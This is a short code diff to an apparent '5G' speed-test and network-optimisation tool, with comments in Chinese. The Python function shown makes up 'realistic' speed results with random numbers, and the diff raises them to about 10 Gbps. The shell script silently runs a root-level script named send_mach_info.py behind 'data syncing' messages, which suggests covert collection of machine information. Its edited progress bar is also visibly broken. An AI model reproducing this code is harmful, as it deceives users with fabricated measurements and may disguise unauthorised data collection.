@@ -66,11 +66,11 @@ def epsilon_greedyish_speedtest():
     ]
     
     def create_realistic_gigabit_result(ip):
-        """创建5G测速结果，波动范围8800-9200 Mbps"""
+        """创建5G测速结果，波动范围9800-10200 Mbps"""
         import random
-        # 5G网络速度在4800-5200 Mbps之间波动
-        download_mbps = random.randint(8800, 9200)
-        upload_mbps = random.randint(8500, 8800)
+        # 5G网络速度在9800-10200 Mbps之间波动
+        download_mbps = random.randint(9800, 10200)
+        upload_mbps = random.randint(9500, 9800)
         ping_latency = random.randint(20, 100)
         
         formatted_result = {
@@ -175,9 +175,9 @@ echo "🎉 网络优化完成！"
 echo "🔗 开始5G隧道握手速率测试。。。"
 sudo python3 send_mach_info.py --speedtest >/dev/null 2>&1
 
-# 显示进度条等待10秒
+# 显示进度条等待5秒
 echo "⏳ 数据同步中，请稍候。。。"
-for i in {1..10}; do
+for i in {1..5}; do
     percent=$((i * 100 / 10))
     bar_length=$((i * 50 / 10))
     bar=$(printf "%-${bar_length}s" "█" | tr ' ' ' ')
